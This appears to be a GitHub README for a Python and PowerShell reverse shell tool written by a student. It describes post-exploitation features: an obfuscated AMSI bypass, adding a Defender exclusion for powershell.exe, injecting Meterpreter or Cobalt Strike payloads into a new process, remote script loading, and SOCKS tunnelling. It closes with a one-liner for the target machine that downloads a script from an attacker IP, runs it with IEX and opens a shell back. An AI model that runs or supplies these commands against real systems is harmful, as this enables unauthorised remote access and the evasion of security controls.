# Introduction

A small reverse shell project that i build during my university intership.\
It is written with Python and Powershell.\
To simply install it:

1.  Clone this repo with the following code
    ```
    git clone https://github.com/Fedami/powerrevshell---rev.ps1
    ```
3.  Run the following code to install all the requirements
    ```
    pip install -r requirements.txt
    ```
3.  Run the following code to make the .py file executable or simply run it with python
    ```
    chmod +x powerrevshell.py or python3 powerrevshell.py
    ```
## Powerrevshell

![powerrevshell-start](https://user-images.githubusercontent.com/82824055/170969038-c81c54a0-721b-44f5-835b-86d11840211f.png)

Powerrevshell.py comes with several function accesibbile via the "menu" option.

### get - put

The get and put functionality are build using TCPSocket to transfer files between the machines, to prevent data loss, on each message, are sent support text and md5sum to know if the actual file option are sent correctly.

```
get <file.txt> / put <file.txt>
```

### smb-get

The smb-get functionality simply transfer a file using the Copy-Item cmdlet to the smbserver started suing impacket-smbserver.\
If you didn't start the program with the -smb switch or started youreself (impacket-smbserver) the command will fail.

```
smb-get <file.txt>
```

### down-file

The down-file functionality simply download a file from the current machine to the target machine using HTTP server with python.
If you didn't start the program with the -http switch or started youreself (python -m http.server 8000) the command will fail.

```
down-file <file.txt>
```

### load

The down-file functionality simply load a powershell script from the current machine to the target machine using HTTP server with python.
If you didn't start the program with the -http switch or started youreself (python -m http.server 8000) the command will fail.

```
load <file.ps1>
```

### amsi-bypass

The amsi-bypass functionality will try to bypass AMSI on the current shell by using the Matt Graeber amsi bypass method obfuscated with two bytes array.

```
amsi-bypass
```

### exclude

The exlucde functionality will try to exclude powershell.exe from defender, admin permission are needed.

```
exclude
```

### payload

The payload functionality will try to create a new process and inject the shell payload can be meterpreter or cobalt strike...\
The paylaod must be a cs file.

```
payload <payload.cs>
```

For the socks functionality this work [PowerProxy by get-get-get-get](https://github.com/get-get-get-get/PowerProxy) is being used.

### socks-start

Socks-start start a socks proxy to your machine.

```
socks-start <L-PORT> <P-PORT>
```

You can also omit <L-PORT> <P-PORT>, by default L-PORT is 8080 and P-PORT is 1080.

### socks-stop
### socks
### close


## Rev.ps1

Rev.ps1 is the powershell script to connect back to us.\
To start the reverse shell run the following code on the target machine.

```
(New-Object System.Net.WebClient).DownloadString('http://<IP>/rev.ps1') IEX; Send-Shell -i <IP> -p <ShellPort>
```
